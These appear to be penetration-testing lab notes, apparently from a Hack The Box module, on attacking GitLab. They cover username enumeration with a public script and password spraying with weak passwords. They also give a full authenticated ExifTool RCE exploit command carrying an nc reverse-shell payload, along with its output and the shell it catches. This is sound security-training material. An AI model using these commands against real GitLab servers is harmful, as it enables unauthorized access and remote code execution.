## Attacking GitLab
### Overview  

GitLab is a web-based Git-repository manager that supports CI/CD pipelines, issue tracking, and collaboration tools. While many deployments are properly secured, even unauthenticated access may lead to severe information leakage or compromise.

GitLab had 553 CVEs reported as of September 2021. While not all of them are exploitable, multiple vulnerabilities have resulted in critical-level issues like Remote Code Execution (RCE).
### Username Enumeration

- GitLab allows user and project enumeration by design. This is not considered a vulnerability by GitLab unless it leads to additional impact.
- Despite this, valid usernames can be leveraged in brute-force or password spraying attacks.
- GitLab's default security config:

```
config.maximum_attempts = 10
config.unlock_in = 10.minutes
```

- These defaults mean:    

    - After 10 failed login attempts, an account gets locked.
    - Unlocks automatically after 10 minutes.
    - These settings are not modifiable via the GitLab UI, only through source modification.

- Tools for enumeration:
    
    - Publicly available script by @4D0niiS: `gitlab_userenum.sh`        
    - Accepts a `--url` to the target GitLab instance and a `--userlist`

Example usage:

```
Yashfren@htb[/htb]$ ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt

[+] The username root exists!
[+] The username bob exists!
```

- Once valid usernames are known, common weak passwords (e.g., `Welcome1`, `Password123`) or leaked credentials from breaches can be tried with controlled spraying.

Authenticated Remote Code Execution (GitLab CE â‰¤ 13.10.2)

- GitLab Community Edition version 13.10.2 and below is vulnerable to an authenticated RCE due to a flaw in ExifTool when parsing image metadata.   
- Vulnerability arises when uploading malicious image files via the Snippets feature.
- Exploiting this allows arbitrary command execution under the `git` user.

Preconditions:

- Requires valid credentials (via OSINT or a working password)
- Or the instance must allow open self-registration

Exploit usage:

```
python3 gitlab_13_10_2_rce.py \
  -t http://gitlab.inlanefreight.local:8081 \
  -u mrb3n \
  -p password1 \
  -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f'
```

Successful exploitation:

```
[1] Authenticating
Successfully Authenticated
[2] Creating Payload 
[3] Creating Snippet and Uploading
[+] RCE Triggered !!
```

Attacker Shell:

```
Yashfren@htb[/htb]$ nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.88] 60054

git@app04:~/gitlab-workhorse$ id
uid=996(git) gid=997(git) groups=997(git)

git@app04:~/gitlab-workhorse$ ls
VERSION
config.toml
flag_gitlab.txt
sockets
```
# Tags
> #Exploitation #Application-Exploitation #Gitlab 